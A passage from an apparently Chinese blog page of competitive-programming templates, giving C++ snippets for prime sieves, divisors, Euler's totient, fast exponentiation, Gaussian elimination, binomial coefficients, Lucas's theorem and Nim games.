st[x]存储x是否被筛掉</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i]) primes[cnt ++ ] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            st[primes[j] * i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-5-试除法求所有约数"><a href="#4-5-试除法求所有约数" class="headerlink" title="4.5 试除法求所有约数"></a>4.5 试除法求所有约数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">get_divisors</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; res;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            res.push_back(i);<br>            <span class="hljs-keyword">if</span> (i != x / i) res.push_back(x / i);<br>        &#125;<br>    sort(res.begin(), res.end());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-6-约数个数和约数之和"><a href="#4-6-约数个数和约数之和" class="headerlink" title="4.6 约数个数和约数之和"></a>4.6 约数个数和约数之和</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">如果 N = p1^c1 * p2^c2 * ... *pk^ck<br>约数个数： (c1 + <span class="hljs-number">1</span>) * (c2 + <span class="hljs-number">1</span>) * ... * (ck + <span class="hljs-number">1</span>)<br>约数之和： (p1^<span class="hljs-number">0</span> + p1^<span class="hljs-number">1</span> + ... + p1^c1) * ... * (pk^<span class="hljs-number">0</span> + pk^<span class="hljs-number">1</span> + ... + pk^ck)<br></code></pre></div></td></tr></table></figure><h3 id="4-7-欧几里得算法"><a href="#4-7-欧几里得算法" class="headerlink" title="4.7 欧几里得算法"></a>4.7 欧几里得算法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> b ? gcd(b, a % b) : a;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-8-求欧拉函数"><a href="#4-8-求欧拉函数" class="headerlink" title="4.8 求欧拉函数"></a>4.8 求欧拉函数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">phi</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = x;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            res = res / i * (i - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) x /= i;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) res = res / x * (x - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-9-筛法求欧拉函数"><a href="#4-9-筛法求欧拉函数" class="headerlink" title="4.9 筛法求欧拉函数"></a>4.9 筛法求欧拉函数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-keyword">int</span> euler[N];           <span class="hljs-comment">// 存储每个数的欧拉函数</span><br><span class="hljs-keyword">bool</span> st[N];         <span class="hljs-comment">// st[x]存储x是否被筛掉</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_eulers</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    euler[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i])<br>        &#123;<br>            primes[cnt ++ ] = i;<br>            euler[i] = i - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            <span class="hljs-keyword">int</span> t = primes[j] * i;<br>            st[t] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>)<br>            &#123;<br>                euler[t] = euler[i] * primes[j];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            euler[t] = euler[i] * (primes[j] - <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-10-快速幂"><a href="#4-10-快速幂" class="headerlink" title="4.10 快速幂"></a>4.10 快速幂</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">求 m^k mod p，时间复杂度 O(logk)。<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">qmi</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span> % p, t = m;<br>    <span class="hljs-keyword">while</span> (k)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (k&amp;<span class="hljs-number">1</span>) res = res * t % p;<br>        t = t * t % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-11-扩展欧几里得算法"><a href="#4-11-扩展欧几里得算法" class="headerlink" title="4.11 扩展欧几里得算法"></a>4.11 扩展欧几里得算法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 求x, y，使得ax + by = gcd(a, b)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> &amp;x, <span class="hljs-keyword">int</span> &amp;y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!b)<br>    &#123;<br>        x = <span class="hljs-number">1</span>; y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">int</span> d = exgcd(b, a % b, y, x);<br>    y -= (a/b) * x;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-12-高斯消元"><a href="#4-12-高斯消元" class="headerlink" title="4.12 高斯消元"></a>4.12 高斯消元</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// a[N][N]是增广矩阵</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gauss</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> c, r;<br>    <span class="hljs-keyword">for</span> (c = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>; c &lt; n; c ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = r;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = r; i &lt; n; i ++ )   <span class="hljs-comment">// 找到绝对值最大的行</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; <span class="hljs-built_in">fabs</span>(a[t][c]))<br>                t = i;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[t][c]) &lt; eps) <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = c; i &lt;= n; i ++ ) swap(a[t][i], a[r][i]);      <span class="hljs-comment">// 将绝对值最大的行换到最顶端</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;= c; i -- ) a[r][i] /= a[r][c];      <span class="hljs-comment">// 将当前行的首位变成1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = r + <span class="hljs-number">1</span>; i &lt; n; i ++ )       <span class="hljs-comment">// 用当前行将下面所有的列消成0</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][c]) &gt; eps)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = n; j &gt;= c; j -- )<br>                    a[i][j] -= a[r][j] * a[i][c];<br><br>        r ++ ;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (r &lt; n)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = r; i &lt; n; i ++ )<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &gt; eps)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// 无解</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 有无穷多组解</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j ++ )<br>            a[i][n] -= a[i][j] * a[j][n];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 有唯一解</span><br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-13-递归法求组合数"><a href="#4-13-递归法求组合数" class="headerlink" title="4.13 递归法求组合数"></a>4.13 递归法求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// c[a][b] 表示从a个苹果中选b个的方案数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i ++ )<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= i; j ++ )<br>        <span class="hljs-keyword">if</span> (!j) c[i][j] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> c[i][j] = (c[i - <span class="hljs-number">1</span>][j] + c[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) % mod;<br></code></pre></div></td></tr></table></figure><h3 id="4-14-通过预处理逆元的方式求组合数"><a href="#4-14-通过预处理逆元的方式求组合数" class="headerlink" title="4.14 通过预处理逆元的方式求组合数"></a>4.14 通过预处理逆元的方式求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">首先预处理出所有阶乘取模的余数fact[N]，以及所有阶乘取模的逆元infact[N]<br>如果取模的数是质数，可以用费马小定理求逆元<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">qmi</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> p)</span>    <span class="hljs-comment">// 快速幂模板</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (k)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;<br>        a = (LL)a * a % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 预处理阶乘的余数和阶乘逆元的余数</span><br>fact[<span class="hljs-number">0</span>] = infact[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i ++ )<br>&#123;<br>    fact[i] = (LL)fact[i - <span class="hljs-number">1</span>] * i % mod;<br>    infact[i] = (LL)infact[i - <span class="hljs-number">1</span>] * qmi(i, mod - <span class="hljs-number">2</span>, mod) % mod;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-15-Lucas定理"><a href="#4-15-Lucas定理" class="headerlink" title="4.15 Lucas定理"></a>4.15 Lucas定理</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">若p是质数，则对于任意整数 <span class="hljs-number">1</span> &lt;= m &lt;= n，有：<br>    C(n, m) = C(n % p, m % p) * C(n / p, m / p) (mod p)<br><br><span class="hljs-keyword">int</span> qmi(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> p)  <span class="hljs-comment">// 快速幂模板</span><br>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span> % p;<br>    <span class="hljs-keyword">while</span> (k)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;<br>        a = (LL)a * a % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> p)</span>  <span class="hljs-comment">// 通过定理求组合数C(a, b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; b) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    LL x = <span class="hljs-number">1</span>, y = <span class="hljs-number">1</span>;  <span class="hljs-comment">// x是分子，y是分母</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = a, j = <span class="hljs-number">1</span>; j &lt;= b; i --, j ++ )<br>    &#123;<br>        x = (LL)x * i % p;<br>        y = (LL) y * j % p;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> x * (LL)qmi(y, p - <span class="hljs-number">2</span>, p) % p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">lucas</span><span class="hljs-params">(LL a, LL b, <span class="hljs-keyword">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; p &amp;&amp; b &lt; p) <span class="hljs-keyword">return</span> C(a, b, p);<br>    <span class="hljs-keyword">return</span> (LL)C(a % p, b % p, p) * lucas(a / p, b / p, p) % p;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-16-分解质因数法求组合数"><a href="#4-16-分解质因数法求组合数" class="headerlink" title="4.16 分解质因数法求组合数"></a>4.16 分解质因数法求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">当我们需要求出组合数的真实值，而非对某个数的余数时，分解质因数的方式比较好用：<br>    <span class="hljs-number">1.</span> 筛法求出范围内的所有质数<br>    <span class="hljs-number">2.</span> 通过 C(a, b) = a! / b! / (a - b)! 这个公式求出每个质因子的次数。 n! 中p的次数是 n / p + n / p^<span class="hljs-number">2</span> + n / p^<span class="hljs-number">3</span> + ...<br>    <span class="hljs-number">3.</span> 用高精度乘法将所有质因子相乘<br><br><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// 存储所有质数</span><br><span class="hljs-keyword">int</span> sum[N];     <span class="hljs-comment">// 存储每个质数的次数</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个数是否已被筛掉</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span>      <span class="hljs-comment">// 线性筛法求素数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i]) primes[cnt ++ ] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            st[primes[j] * i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> p)</span>       <span class="hljs-comment">// 求n！中的次数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (n)<br>    &#123;<br>        res += n / p;<br>        n /= p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; a, <span class="hljs-keyword">int</span> b)</span>       <span class="hljs-comment">// 高精度乘低精度模板</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; c;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; a.size(); i ++ )<br>    &#123;<br>        t += a[i] * b;<br>        c.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (t)<br>    &#123;<br>        c.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br>get_primes(a);  <span class="hljs-comment">// 预处理范围内的所有质数</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i ++ )     <span class="hljs-comment">// 求每个质因数的次数</span><br>&#123;<br>    <span class="hljs-keyword">int</span> p = primes[i];<br>    sum[i] = get(a, p) - get(b, p) - get(a - b, p);<br>&#125;<br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; res;<br>res.push_back(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i ++ )     <span class="hljs-comment">// 用高精度乘法将所有质因子相乘</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; sum[i]; j ++ )<br>        res = mul(res, primes[i]);<br><br></code></pre></div></td></tr></table></figure><h3 id="4-17-卡特兰数"><a href="#4-17-卡特兰数" class="headerlink" title="4.17 卡特兰数"></a>4.17 卡特兰数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给定n个<span class="hljs-number">0</span>和n个<span class="hljs-number">1</span>，它们按照某种顺序排成长度为<span class="hljs-number">2</span>n的序列，满足任意前缀中<span class="hljs-number">0</span>的个数都不少于<span class="hljs-number">1</span>的个数的序列的数量为： Cat(n) = C(<span class="hljs-number">2</span>n, n) / (n + <span class="hljs-number">1</span>)<br></code></pre></div></td></tr></table></figure><h3 id="4-18-NIM游戏"><a href="#4-18-NIM游戏" class="headerlink" title="4.18 NIM游戏"></a>4.18 NIM游戏</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给定N堆物品，第i堆物品有Ai个。两名玩家轮流行动，每次可以任选一堆，取走任意多个物品，可把一堆取光，但不能不取。取走最后一件物品者获胜。两人都采取最优策略，问先手是否必胜。<br><br>我们把这种游戏称为NIM博弈。把游戏过程中面临的状态称为局面。整局游戏第一个行动的称为先手，第二个行动的称为后手。若在某一局面下无论采取何种行动，都会输掉游戏，则称该局面必败。<br>所谓采取最优策略是指，若在某一局面下存在某种行动，使得行动后对面面临必败局面，则优先采取该行动。同时，这样的局面被称为必胜。我们讨论的博弈问题一般都只考虑理想情况，即两人均无失误，都采取最优策略行动时游戏的结果。<br>NIM博弈不存在平局，只有先手必胜和先手必败两种情况。<br><br>定理： NIM博弈先手必胜，当且仅当 A1 ^ A2 ^ … ^ An != <span class="hljs-number">0</span><br><br></code></pre></div></td></tr></table></figure><h3 id="4-19-公平组合游戏ICG"><a href="#4-19-公平组合游戏ICG" class="headerlink" title="4.19 公平组合游戏ICG"></a>4.19 公平组合游戏ICG</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">若一个游戏满足：<br><br><span class="hljs-number">1.</span>由两名玩家交替行动；<br><span 